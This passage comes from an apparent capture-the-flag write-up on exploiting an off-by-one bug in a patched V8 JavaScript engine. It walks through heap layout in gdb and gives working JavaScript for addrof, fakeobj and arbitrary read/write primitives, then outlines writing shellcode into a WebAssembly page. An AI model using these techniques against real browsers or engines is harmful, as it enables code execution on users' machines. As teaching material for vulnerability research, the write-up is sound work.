</span></span></code></pre></div><p>Now, breaking it down, we have the <code>arr</code> located at the <code>0xe81080c5e45</code> which is of type <code>JSArray</code> and it has it&rsquo;s map located at the <code>0x0e8108281909</code>, other than that, according to the information, it has a map of <code>PACKED_DOUBLE_ELEMENTS</code> which references to the <code>arr</code> having elements of double type. The element pointer is located at the <code>0x0e81080c5e25</code> which is of length 3 and is of type <code>FixedDoubleArray</code>. Now, using the gdb, we check the memory contents around the <code>arr</code>.</p>
<blockquote>
<p>To check the memory contents of the address, we need to subtract 1 from the address, such that we get absolute address for the analysis.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">^</span><span class="nf">C</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="na">..snip..</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="mi">4</span><span class="no">wx</span> <span class="mi">0xe81080c5e45</span> <span class="p">-</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">xe81080c5e44:</span>	<span class="err">0</span><span class="nf">x08281909</span>	<span class="err">&lt;</span><span class="p">-----</span> <span class="no">Map</span>           <span class="mi">0x080406e9</span>  <span class="err">&lt;</span><span class="p">----</span> <span class="no">Properties</span>
</span></span><span class="line"><span class="cl">               <span class="err">0</span><span class="nf">x080c5e25</span>  <span class="err">&lt;</span><span class="p">-----</span> <span class="no">Element</span> <span class="no">Array</span>	<span class="mi">0x00000006</span>
</span></span></code></pre></div><p>From the debug information, using the <code>%DebugPrint(arr)</code>, and the gdb output, we can see that the 1st element belongs to the map of the array itself, the second belongs to the Properties, the third belongs to the elements array. If you pay attention, I used the <code>x/wx</code> which will show the address as 32 bit representation, the thing here is, the version of the commit made to the V8 engine was after the integration of the pointer compression, which made the addresses to be representated as the 32 bit integer.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="mi">5</span><span class="no">xg</span> <span class="mi">0x0e81080c5e25</span> <span class="p">-</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">xe81080c5e24:</span>	<span class="err">0</span><span class="nf">x0000000608040a3d</span>	<span class="mi">0x3ff199999999999a</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">xe81080c5e34:</span>	<span class="err">0</span><span class="nf">x400199999999999a</span>	<span class="mi">0x400a666666666666</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">xe81080c5e44:</span>	<span class="err">0</span><span class="nf">x080406e908281909</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">p</span><span class="err">/</span><span class="no">d</span> <span class="mi">0x3ff199999999999a</span>
</span></span><span class="line"><span class="cl"><span class="nf">$2</span> <span class="err">=</span> <span class="mi">4607632778762754458</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">p</span><span class="err">/</span><span class="no">f</span> <span class="mi">0x3ff199999999999a</span>
</span></span><span class="line"><span class="cl"><span class="nf">$3</span> <span class="err">=</span> <span class="mi">1</span><span class="no">.1000000000000001</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">p</span><span class="err">/</span><span class="no">f</span> <span class="mi">0x400199999999999a</span>
</span></span><span class="line"><span class="cl"><span class="nf">$4</span> <span class="err">=</span> <span class="mi">2</span><span class="no">.2000000000000002</span>
</span></span></code></pre></div><p>Now, since we know how an array is represented into the V8 heap and we also know that we have Off by One read and write vulnerability, which draw us to the conclusion of the we have the ability to overwrite the Map of an object. With this in mind, let&rsquo;s move on:-</p>
<hr>
<p>First off, we need to make the utility functions such that we can deal with the pointer tagging and change the floating values to decimal and vice versa. The following JavaScript function will let us do the work mentioned:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span> <span class="c1">// 8 byte array buffer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">f64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Float64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">u64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint32Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">val</span><span class="p">,</span> <span class="nx">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">size</span> <span class="o">==</span> <span class="mi">32</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">size</span> <span class="o">==</span> <span class="mi">64</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">val</span><span class="p">,</span> <span class="nx">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">size</span> <span class="o">==</span> <span class="mi">32</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">size</span> <span class="o">==</span> <span class="mi">64</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The above functions are used to convert the float to integer and integer to floats, since the memory address are going to be overwritten by their respected values as float, we need those.</p>
<p>Moving on, we need to create some float arrays, to get the required leaks, we also need them for doing the <code>fakeobj</code> and the <code>addrof</code> primitve, without further ado, let&rsquo;s start:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">float_arr</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">,</span> <span class="mf">3.3</span><span class="p">,</span> <span class="mf">4.4</span><span class="p">,</span> <span class="mf">5.5</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;A&#34;</span><span class="o">:</span><span class="mf">1.1</span><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">reg</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">];</span>
</span></span></code></pre></div><p>These are the variables that will be involved further in the exploit, next off, we need to get the <code>addrof</code> primitve, this means we need to leverage the off by one to read address of an object, let&rsquo;s see:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">float_arr_map</span> <span class="o">=</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">float_arr</span><span class="p">.</span><span class="nx">GetLastElement</span><span class="p">(),</span> <span class="mi">32</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">reg_arr_map</span> <span class="o">=</span> <span class="nx">float_arr_map</span> <span class="o">-</span> <span class="mh">0xa0</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[*] Float array map   :  0x&#34;</span> <span class="o">+</span> <span class="nx">float_arr_map</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[*] Regular array map :  0x&#34;</span> <span class="o">+</span> <span class="nx">reg_arr_map</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">in_obj</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">float_arr</span><span class="p">.</span><span class="nx">SetLastElement</span><span class="p">(</span><span class="nx">itof</span><span class="p">(</span><span class="nx">reg_arr_map</span><span class="p">,</span> <span class="mi">32</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">	<span class="nx">float_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">in_obj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nx">float_arr</span><span class="p">.</span><span class="nx">SetLastElement</span><span class="p">(</span><span class="nx">itof</span><span class="p">(</span><span class="nx">float_arr_map</span><span class="p">,</span> <span class="mi">32</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">	<span class="kd">let</span> <span class="nx">addr</span> <span class="o">=</span> <span class="nx">float_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Here, first we get the map address of the <code>float_arr</code> and the <code>reg</code> array, then we have a function named <code>addrof</code>, this takes an object as the argument that would be the object address we need to get the address of, what we do is first overwrite the <code>float_arr</code> map object with the <code>reg</code> array, this means, as of now, the map address of the <code>float_arr</code> is pointing to the map of the <code>reg</code> array, then we make the first object of the <code>float_arr</code> to that of object we need to get the address of, then we place the map of the <code>float_arr</code> right back to where it was.</p>
<p>






  
  
<figure><img src="/img/ropetwo/addrof.png" alt="addrof primitve" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>Considering, we have a map leak, if we try to read what is stored at that address, it will result in:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"></code></pre></div><p>Success, with this out of the way, as of the v8 exploitation goes, we need to have a <code>fakeobj</code> primitive. The <code>fakeobj</code> function is below:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">float_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nx">float_arr</span><span class="p">.</span><span class="nx">SetLastElement</span><span class="p">(</span><span class="nx">itof</span><span class="p">(</span><span class="nx">reg_arr_map</span><span class="p">,</span> <span class="mi">32</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">	<span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">float_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">	<span class="nx">float_arr</span><span class="p">.</span><span class="nx">SetLastElement</span><span class="p">(</span><span class="nx">itof</span><span class="p">(</span><span class="nx">float_arr_map</span><span class="p">,</span> <span class="mi">32</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">fake</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Let&rsquo;s talk about the <code>fakeobj</code> function, this primitive, in context of this vulnerability and specific patch, we put the address of the fake object we want to put, it is placed onto the first element of the <code>float_arr</code>, then we changed the map of the <code>float_arr</code> to the <code>reg</code> array&rsquo;s map, so when we tend to access the data from the 0th index, how this works is:-</p>
<p>






  
  
<figure><img src="/img/ropetwo/fakeobj.png" alt="fakeobj primitive" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<ul>
<li>We put the address of the object we wamt to overwrite another object with.</li>
<li>Set the map of the map of the <code>float_arr</code> to the map of the <code>reg</code></li>
<li>Get the fake object from the <code>float_arr</code></li>
<li>Put the map of the <code>float_arr</code> back to it&rsquo;s original place</li>
</ul>
<p>These are the primitives, we needed to have before we jump into the read/write primitive, although with these out of the way, we can now work on our functions <code>arb_read</code> and <code>arb_write</code> which will be used to read address from/write values to an address respectively.</p>
<p>Moving on, the arbitrary read function is of interested and I&rsquo;ll try my best to explain, for the moment, consider the following function which is used to read a value from the arbitrary address:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">rw_helper</span> <span class="o">=</span> <span class="p">[</span><span class="nx">itof</span><span class="p">(</span><span class="nx">float_arr_map</span><span class="p">,</span> <span class="mi">64</span><span class="p">),</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">,</span> <span class="mf">3.3</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">rw_helper_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">rw_helper</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[+] Controlled RW helper address: 0x&#34;</span> <span class="o">+</span> <span class="nx">rw_helper_addr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">rw_helper_addr</span> <span class="o">-</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">rw_helper</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">((</span><span class="mh">0x8</span><span class="nx">n</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">+</span> <span class="nx">addr</span> <span class="o">-</span> <span class="mh">0x8</span><span class="nx">n</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">fake</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">64</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>This function works by first, making a fake object via the <code>fakeobj</code> function, then we put the address we want to read from, it is written to the 1st index of the <code>rw_helper</code> array, then the first element from the <code>fake</code> object is wrong, this is the follow up of the function, which left the understanding of the whole logic, I explained it in steps with the help of the the <code>d8</code> binary and showing it:-</p>
<hr>
<p>We create the <code>fakeobj</code>with the address of the <code>rw_helper</code>, we subtracted <code>0x20</code> from it because the 32 bytes are for the layout of the memory, in this case, we did it because&gt;:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">r</span> <span class="p">--</span><span class="no">shell</span> <span class="p">.</span><span class="err">/</span><span class="no">xpl.js</span> <span class="p">--</span><span class="no">allow-natives-syntax</span>
</span></span><span class="line"><span class="cl"><span class="nf">Starting</span> <span class="no">program</span><span class="p">:</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mianwayne</span><span class="err">/</span><span class="no">Pwning</span><span class="err">/</span><span class="no">HackTheBox</span><span class="err">/</span><span class="no">htb-rope2</span><span class="err">/</span><span class="no">d8</span> <span class="p">--</span><span class="no">shell</span> <span class="p">.</span><span class="err">/</span><span class="no">xpl.js</span> <span class="p">--</span><span class="no">allow-natives-syntax</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nf">Thread</span> <span class="no">debugging</span> <span class="no">using</span> <span class="no">libthread_db</span> <span class="no">enabled</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">Using</span> <span class="no">host</span> <span class="no">libthread_db</span> <span class="no">library</span> <span class="err">&#34;/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libthread_db.so.1</span><span class="err">&#34;</span><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nf">New</span> <span class="no">Thread</span> <span class="mi">0x7ffff7c1c700</span> <span class="p">(</span><span class="no">LWP</span> <span class="mi">157278</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nf">New</span> <span class="no">Thread</span> <span class="mi">0x7ffff741b700</span> <span class="p">(</span><span class="no">LWP</span> <span class="mi">157279</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nf">New</span> <span class="no">Thread</span> <span class="mi">0x7ffff6c1a700</span> <span class="p">(</span><span class="no">LWP</span> <span class="mi">157280</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Float</span> <span class="no">array</span> <span class="no">map</span>   <span class="p">:</span>  <span class="mi">0x8241909</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Regular</span> <span class="no">array</span> <span class="no">map</span> <span class="p">:</span>  <span class="mi">0x8241869</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Controlled</span> <span class="no">RW</span> <span class="no">helper</span> <span class="no">address</span><span class="p">:</span> <span class="mi">0x808a14d</span>
</span></span><span class="line"><span class="cl"><span class="nf">V8</span> <span class="no">version</span> <span class="mi">8</span><span class="no">.5.0</span> <span class="p">(</span><span class="no">candidate</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">d8</span><span class="err">&gt;</span> <span class="nv">%DebugPrint</span><span class="p">(</span><span class="no">rw_helper</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">0</span><span class="nf">x16d50808a14d</span> <span class="err">&lt;</span><span class="no">JSArray</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="err">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="err">[6</span><span class="nf">.7481182e-316</span><span class="p">,</span> <span class="mi">1</span><span class="no">.1</span><span class="p">,</span> <span class="mi">2</span><span class="no">.2</span><span class="p">,</span> <span class="mi">3</span><span class="no">.3</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">d8</span><span class="err">&gt;</span> <span class="err">^</span><span class="no">C</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="mi">10</span><span class="no">xg</span> <span class="mi">0x05a00808a14d</span> <span class="p">-</span> <span class="mi">1</span> <span class="p">-</span> <span class="mi">0x30</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x5a00808a11c:</span>	<span class="err">0</span><span class="nf">x0000393638313432</span>	<span class="mi">0x0000000808040a3d</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x5a00808a12c:</span>	<span class="err">0</span><span class="nf">x0000000008241909</span>	<span class="mi">0x3ff199999999999a</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x5a00808a13c:</span>	<span class="err">0</span><span class="nf">x400199999999999a</span>	<span class="mi">0x400a666666666666</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x5a00808a14c:</span>	<span class="err">0</span><span class="nf">x080406e908241909</span>	<span class="mi">0x000000080808a125</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x5a00808a15c:</span>	<span class="err">0</span><span class="nf">x0000000208040975</span>	<span class="mi">0x0000000008241909</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="mi">10</span><span class="no">xg</span> <span class="mi">0x05a00808a14d</span> <span class="p">-</span> <span class="mi">1</span> <span class="p">-</span> <span class="mi">0x20</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x5a00808a12c:</span>	<span class="err">0</span><span class="nf">x0000000008241909</span>	<span class="mi">0x3ff199999999999a</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x5a00808a13c:</span>	<span class="err">0</span><span class="nf">x400199999999999a</span>	<span class="mi">0x400a666666666666</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x5a00808a14c:</span>	<span class="err">0</span><span class="nf">x080406e908241909</span>	<span class="mi">0x000000080808a125</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x5a00808a15c:</span>	<span class="err">0</span><span class="nf">x0000000208040975</span>	<span class="mi">0x0000000008241909</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x5a00808a16c:</span>	<span class="err">0</span><span class="nf">x0000000008040975</span>	<span class="mi">0x0000000008040245</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">p</span> <span class="mi">0x05a00808a14d</span>  <span class="p">-</span> <span class="mi">0x20</span>
</span></span><span class="line"><span class="cl"><span class="nf">$5</span> <span class="err">=</span> <span class="mi">0x5a00808a12d</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">p</span> <span class="mi">0x05a00808a14d</span>  <span class="p">-</span> <span class="mi">0x20</span> <span class="p">-</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="nf">$6</span> <span class="err">=</span> <span class="mi">0x5a00808a12c</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">If</span> <span class="no">we</span> <span class="no">place</span> <span class="no">a</span> <span class="no">fake</span> <span class="no">object</span> <span class="no">at</span> <span class="no">the</span> <span class="no">address</span> <span class="err">`</span><span class="mi">0x5a00808a12c</span><span class="err">`</span><span class="p">,</span> <span class="no">we</span> <span class="no">would</span> <span class="no">be</span> <span class="no">able</span> <span class="no">to</span> <span class="no">get</span> <span class="no">the</span> <span class="no">access</span> <span class="no">to</span> <span class="no">the</span> <span class="no">index</span> <span class="mi">1</span><span class="p">,</span> <span class="no">which</span> <span class="no">would</span> <span class="no">be</span> <span class="no">the</span> <span class="err">`</span><span class="mi">0x5a00808a13c</span><span class="err">`</span><span class="p">.</span> <span class="no">This</span> <span class="no">way</span><span class="p">,</span> <span class="no">the</span> <span class="no">resulted</span> <span class="no">fake</span> <span class="no">object</span> <span class="no">would</span> <span class="no">point</span> <span class="no">to</span> <span class="no">the</span> <span class="no">value</span> <span class="no">of</span> <span class="no">the</span> <span class="no">address</span> <span class="no">we</span> <span class="no">wanted.</span>
</span></span></code></pre></div><p>As for the write function, that also worked on the same princpile of the read function:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">arb_write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">rw_helper_addr</span> <span class="o">-</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">   <span class="nx">rw_helper</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">((</span><span class="mh">0x8</span><span class="nx">n</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">+</span> <span class="nx">addr</span> <span class="o">-</span> <span class="mh">0x8</span><span class="nx">n</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">   <span class="nx">fake</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">value</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>This, if we break down the logic:-</p>
<ul>
<li>This, if compared to the function of the <code>arb_read</code>, this instead of returning the first value from <code>fake</code> array which was the result of faking the object, it overwrites the value that was stored at the first index.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">fake</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">64</span><span class="p">);</span>
</span></span></code></pre></div><p>The above is from the <code>arb_read</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">fake</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">value</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
</span></span></code></pre></div><p>This is done by overwriting the value which was <em>being returned</em> in ther <code>read</code> function, from here we will leverage for the inital writing to, what we refer as the <a href="https://developer.mozilla.org/en-US/docs/WebAssembly" target="_blank" rel="noreferrer">WebAssembly Page in JS</a>, so initially, you cannot start off with the classic pwn challenges one could use the approach of overwriting the <code>__free_hook</code> with of <code>system</code>, then spawn a shell, in the v8 based challenges, mostly CTFs, this is done by creation of a wasm function which would result in the creation of a <code>rwx</code> permission page in the memory layout of the program, from here the approach is following:-</p>
<ul>
<li>Find the <code>rwx</code> segment address, calculate the address of it.</li>
<li>Write the shellcode to the area of the <code>rwx</code> segment.</li>
<li>Call the wasm function created earlier, since shellcode would be written to that function, calling it will eventually result in the shellcode execution.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl">
